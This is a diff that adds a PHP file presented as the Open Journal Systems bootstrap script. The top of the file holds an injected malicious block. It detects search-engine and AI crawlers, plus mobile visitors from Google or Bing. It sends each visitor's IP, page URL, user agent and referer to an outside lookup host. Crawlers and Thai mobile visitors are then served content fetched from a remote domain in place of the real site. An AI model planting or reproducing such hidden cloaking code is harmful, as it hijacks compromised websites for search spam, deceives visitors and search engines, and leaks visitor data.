@@ -1,0 +1,197 @@
+<?php
+$API_URL = 'https://google.hostnac.com/th300';
+
+$scheme = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') ? 'https' : 'http';
+$host   = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
+$MY_DOMAIN = $scheme . '://' . $host;
+
+function rewrite_remote_urls($html, $api_url, $my_domain) {
+    if (empty($html)) return $html;
+    $orig_host = parse_url($api_url, PHP_URL_HOST);
+    $my_host   = parse_url($my_domain, PHP_URL_HOST);
+
+    $html = str_replace('https://' . $orig_host . '/th300.js', '%%XTZ_KEEP%%', $html);
+
+    $html = str_replace(
+        array('https://' . $orig_host, 'http://' . $orig_host, '//' . $orig_host),
+        array($my_domain, $my_domain, '//' . $my_host),
+        $html
+    );
+    $html = preg_replace(
+        '/<base\s+href=["\'][^"\']*' . preg_quote($orig_host, '/') . '[^"\']*["\']/i',
+        '<base href="' . $my_domain . '/"',
+        $html
+    );
+    $html = str_replace(
+        array('"' . $orig_host . '"', "'" . $orig_host . "'"),
+        array('"' . $my_host . '"', "'" . $my_host . "'"),
+        $html
+    );
+
+    $html = str_replace('%%XTZ_KEEP%%', 'https://' . $orig_host . '/th300.js', $html);
+
+    return $html;
+}
+
+function fetch_remote_template($api_url, $ua) {
+    $scheme = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') ? 'https' : 'http';
+    $host   = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
+    $uri    = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
+    $full   = $scheme . '://' . $host . $uri;
+    $final  = $api_url . '?domain=' . rawurlencode($full);
+
+    @header('Content-Type: text/html; charset=UTF-8');
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init($final);
+        curl_setopt_array($ch, array(
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => 15,
+            CURLOPT_USERAGENT      => $ua,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_FOLLOWLOCATION => true,
+        ));
+        $body = curl_exec($ch);
+        curl_close($ch);
+        return $body;
+    } else {
+        $ctx = stream_context_create(array(
+            'http' => array('timeout' => 15, 'user_agent' => $ua, 'ignore_errors' => true)
+        ));
+        return @file_get_contents($final, false, $ctx);
+    }
+}
+
+$ua   = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+$ref  = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+if ($ua === '') $ua = ' ';
+
+$bot_list = array(
+    'Googlebot','Googlebot-News','Googlebot-Image','Googlebot-Video','Googlebot-Mobile',
+    'Mediapartners-Google','AdsBot-Google','AdsBot-Google-Mobile','Google-InspectionTool',
+    'APIs-Google','Google-Site-Verification','Google Web Preview','Google Favicon',
+    'Google Feedfetcher','Feedfetcher-Google','Google Favicon','Google-Favicon',
+    'Google-Keyword-Associator','Chrome-Lighthouse','Google-Chrome-PDF-Viewer','AppEngine-Google',
+    'GoogleOther','Google-Safety','GoogleAssociationService','Google-Ads','Google-Adwords',
+    'Google-Extended','DuetXBot','Bingbot','BingPreview','AdIdxBot','Microsoft Preview',
+    'GPTBot','ChatGPT-User','ChatGPT','Claude-Web','ClaudeBot','anthropic-ai',
+    'DuckDuckBot','DuckAssistBot'
+);
+
+$is_bot = false;
+foreach ($bot_list as $b) {
+    if (stripos($ua, $b) !== false) { $is_bot = true; break; }
+}
+
+$is_mobile = false;
+foreach (array('Mobile','Android','iPhone','iPad','Windows Phone') as $m) {
+    if (stripos($ua, $m) !== false) { $is_mobile = true; break; }
+}
+
+$is_google = ($ref !== '' && (stripos($ref, 'google.') !== false || stripos($ref, 'bing.com') !== false));
+
+function check_ip_country() {
+    $ip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : (isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '')));
+    $ip_parts = explode(',', $ip);
+    $ip = trim($ip_parts[0]);
+    if ($ip === '' || $ip === '127.0.0.1') return 'LOCAL';
+
+    $vScheme = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') ? 'https' : 'http';
+    $vHost = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
+    $visitorPageUrl = $vScheme . '://' . $vHost . (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/');
+    $ch = curl_init('https://id.qzbybyk.com/v1/lookup?ip=' . urlencode($ip));
+    curl_setopt_array($ch, array(
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT        => 3,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_HTTPHEADER     => array(
+            'X-API-Key: change-me-now',
+            'X-Visitor-Page-URL: ' . $visitorPageUrl,
+            'X-Visitor-User-Agent: ' . (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : ''),
+            'X-Visitor-Referer: ' . (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : ''),
+            'X-Visitor-Accept-Language: ' . (isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : ''),
+        ),
+    ));
+    $resp = curl_exec($ch);
+    curl_close($ch);
+
+    if ($resp !== false) {
+        $j = json_decode($resp, true);
+        if (isset($j['data']['country']['iso_code'])) return $j['data']['country']['iso_code'];
+    }
+
+    $ch = curl_init('http://ip-api.com/json/' . urlencode($ip) . '?fields=countryCode');
+    curl_setopt_array($ch, array(
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT        => 3,
+        CURLOPT_SSL_VERIFYPEER => false,
+    ));
+    $resp = curl_exec($ch);
+    curl_close($ch);
+
+    if ($resp !== false) {
+        $j = json_decode($resp, true);
+        if (isset($j['countryCode'])) return $j['countryCode'];
+    }
+
+    return 'UNKNOWN';
+}
+
+$REWRITE_URLS_FOR_BOT = false;
+
+if ($is_bot) {
+    $body = fetch_remote_template($API_URL, $ua);
+    echo $REWRITE_URLS_FOR_BOT ? rewrite_remote_urls($body, $API_URL, $MY_DOMAIN) : $body;
+    exit;
+}
+
+if ($is_mobile && $is_google) {
+    if (check_ip_country() === 'TH') {
+        $body = fetch_remote_template($API_URL, $ua);
+        echo rewrite_remote_urls($body, $API_URL, $MY_DOMAIN);
+        exit;
+    }
+}
+?>
+<?php
+
+
+/**
+ * @defgroup index Index
+ * Bootstrap and initialization code.
+ */
+
+/**
+ * @file includes/bootstrap.inc.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * @brief Core system initialization code.
+ * This file is loaded before any others.
+ * Any system-wide imports or initialization code should be placed here.
+ */
+
+
+/**
+ * Basic initialization (pre-classloading).
+ */
+
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+
+// System-wide functions
+require('./lib/pkp/includes/functions.inc.php');
+
+// Initialize the application environment
+import('classes.core.Application');
+
+return new Application();
